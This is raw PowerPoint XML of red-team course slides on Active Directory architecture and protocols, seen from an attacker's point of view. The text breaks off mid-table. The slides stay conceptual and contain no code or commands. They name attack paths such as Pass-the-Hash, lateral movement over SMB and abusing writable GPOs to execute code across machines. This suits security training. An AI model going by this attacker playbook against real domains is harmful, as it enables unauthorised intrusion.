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4" r:id="rId29"/>
    <p:sldId id="282" r:id="rId30"/>
    <p:sldId id="283" r:id="rId31"/>
    <p:sldId id="285" r:id="rId32"/>
    <p:sldId id="286" r:id="rId33"/>
    <p:sldId id="287" r:id="rId34"/>
    <p:sldId id="299" r:id="rId35"/>
    <p:sldId id="289" r:id="rId36"/>
    <p:sldId id="288" r:id="rId37"/>
    <p:sldId id="298" r:id="rId38"/>
    <p:sldId id="291" r:id="rId39"/>
    <p:sldId id="292" r:id="rId40"/>
    <p:sldId id="293" r:id="rId41"/>
    <p:sldId id="297" r:id="rId42"/>
    <p:sldId id="300" r:id="rId43"/>
    <p:sldId id="29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5" autoAdjust="0"/>
    <p:restoredTop sz="92584" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="72" d="100"/>
          <a:sy n="72" d="100"/>
        </p:scale>
        <p:origin x="7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58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1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9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3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0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7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9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5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5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2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7B32B-914D-4E2A-BE6B-2AAB04D508A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B7DF5-EAB0-4522-A942-EBB7AF48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7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Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Niaz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Red Team Instructor at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Cyberster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9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b="1" dirty="0"/>
              <a:t>Week 07: Active Directory Enumeration &amp; Kerberos Attacks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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Objective</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: To understand the architecture of a Windows Domain environment and learn how to identify misconfigurations in the Kerberos authentication protocol. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="273921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92" y="365125"/>
            <a:ext cx="11002108" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 01: Understanding AD Architecture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88900" y="1572406"/>
            <a:ext cx="122809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Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Before attacking, you must understand the components of a Windows Domain. </a:t>
            </a:r>
          </a:p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Technical Requirements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b="1" dirty="0"/>
              <a:t>Theory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Research and document the roles of a Domain Controller (DC), Global Catalog, Organizational Units (OU), and Group Policy Objects (GPO). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Protocol Research</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Explain the difference between LDAP, SMB, and RPC in an AD context.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty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Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: You cannot hack what you don't understand. Mapping the "Forest" and "Trees" is the first step.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314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362664"/>
            <a:ext cx="12192000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Week 07 REQUIREMENTS assume you already have access inside a domain environment.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This access comes from earlier stages of the attack (Weeks 3 Task 4, week 5,6), where you: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- Gained initial access (shell on a machine) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="17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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Weeks 3 Task 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- Performed post-exploitation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Week 5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- Moved inside the internal network (pivoting) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Week 6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- Obtain domain user context or credentials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By the start of Week 07, you are operating as a domain user on a domain-joined </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>machine.</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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— CORE ACTIVE DIRECTORY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Domain Controller (DC)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 of the entire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.Meaning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The Domain Controller is the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>central authority</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> of the domain.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🔹 What it does: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Authenticates users (via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Kerberos / NTLM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AD database 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NTDS.dit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Enforces policies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login requests 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Think like an attacker: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This is not just “a server” — it is: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          Identity + Trust + Control in one place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own the DC →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own EVERYTHING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contains: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hashes                                                          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>If compromised: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Kerberos tickets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relationships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861494"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="7400413" y="5522660"/>
          <a:ext cx="3483897" cy="133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897">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1198441394"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="283224">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="1700" dirty="0"/>
                        <a:t>Full credential exposure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729981"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="434149">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="1"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="1700" dirty="0"/>
                        <a:t>Domain-wide control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51945"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="550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Ability to impersonate any user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06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57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65" y="43934"/>
            <a:ext cx="12192000" cy="68140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B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🌐</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. Global Catalog (GC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>This is like a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>search engine of the domain/forest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>. A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>partial replica of all objects in the forest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/domain.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</a:rPr>
              <a:t>🔹</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> What it does:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Stores a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>partial copy of all objects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Helps with: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>User searches </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Logins across domains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Cross-domain authentication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lookup without querying each domain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latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔹</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Why it matters: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it as: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“Index of the entire forest”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Faster enumeration </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Contains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>useful metadata</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> about users/groups </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>For example </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>It reveals:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Users across domains </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Group memberships </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Structural relationships</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Attacker angle:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Helps you </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>map the environment quickly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Useful in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>domain-wide enumeration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9397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12192000" cy="7773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C89800"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>📂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3. Organizational Units (OU)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just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grouping of objects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Company.local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IT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HR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Finance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What it does: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OUs are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>logical containers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> used to organize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policies (GPOs)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Attacker mindset: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OUs tell you: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has power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admins are concentrated </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>IT OU → likely admin-heavy </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Finance OU → sensitive targets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selection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700" dirty="0"/>
              <a:t>They also:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Control delegation </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Link GPOs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5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2" y="0"/>
            <a:ext cx="12095018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Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>⚙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>️ 4. Group Policy Objects (GPO)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>This is where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>real control happens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b="1" dirty="0"/>
              <a:t>🔹 What it does:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>GPOs define </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>rules enforced across systems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Password policies </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Software installs </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Startup/login Scripts </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Security configurations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Insight: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GPO = Remote control of machines at scale</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>🔹 Why it’s dangerous:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Misconfigurations can allow:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Unauthorized modifications </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Code execution across multiple systems</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Misconfigured GPO = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>instant privilege escalation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👉 Attacker angle:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Modify GPO → execute code on many machines </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Look for: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Writable GPOs </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Startup scripts </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Weak permissions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="224890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1256"/>
            <a:ext cx="12192000" cy="6596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latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PART </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>— </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PROTOCOLS IN ACTIVE DIRECTORY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📡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 LDAP (Lightweight Directory Access Protocol)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Purpose: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AD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Read/write directory data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Used for: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enumeration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Group membership lookup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Object attributes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Attacker usage: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"Who are the admins?"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"Which machines exist?"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"Who has SPNs?“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Conceptual Use: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Ask the domain questions → get structured answers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8395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4731" y="450250"/>
            <a:ext cx="11996057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📁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2. SMB (Server Message Block)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Purpose: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sharing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communication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access to systems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flows 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Used for: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shares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execution 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psexec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-style)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Attacker usage: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Lateral movement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Dumping files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Pass-the-Hash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Important ports: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445 (SMB)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Idea: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SMB = Interaction with machines (files + execution paths)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79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B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🔗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RPC (Remote Procedure Call)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>🔹 Role:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>RPC allows systems to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Communicate internally </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Execute remote functions </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Manage services</a:t>
            </a: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🔹 Purpose:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Communication between services </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>🔹 Used for:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>AD management </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Service interaction </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Remote operations </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>👉 Attacker usage:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Enumerating users/groups </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Triggering remote actions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Concept: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 Unicode MS"/>
              </a:rPr>
              <a:t>RPC = Ask a system to DO something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95083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12192000" cy="670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70C0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>⚔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>️DIFFERENCE (IMPORTANT FOR ATTACK PATHS)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B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🌲 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>THE "FOREST &amp; TREES" MINDSET</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>This is where most beginners fail.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00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🌳</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Forest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Top-level structure </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Contains multiple domains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00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🌲</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Domain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Logical boundary </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Users + computers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00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🌿 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Objects</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Users, groups, machines</a:t>
            </a:r>
          </a:p>
          <a:p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651465"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="567203"/>
          <a:ext cx="5581649" cy="2097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324">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="701997173"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1439099">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="135765100"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3063226">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3039215727"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="3929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Protocol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Role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Attacker Use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636872"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="6264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LDAP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Query directory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Recon, enumeration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562672"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3929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SMB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File + auth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Lateral movement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024618"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="6780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RPC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Service calls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Deeper enumeration, execution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539351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905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68061"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5581649" y="567202"/>
          <a:ext cx="2990851" cy="2097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851">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2325917380"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="514074">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>What It Interacts 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76994"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="555483">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
